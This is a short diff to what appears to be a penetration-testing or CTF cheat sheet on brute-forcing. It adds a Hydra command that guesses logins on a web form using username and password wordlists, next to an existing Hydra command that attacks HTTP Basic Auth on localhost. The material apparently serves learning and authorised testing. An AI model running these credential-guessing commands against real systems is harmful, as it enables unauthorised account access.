@@ -225,3 +225,4 @@ for password in passwords:
 #### Bruteforcing Basic HTTP Auth:
 ```hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81```
 #### Bruteforcing Login Forms:
+```hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <IP> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"```
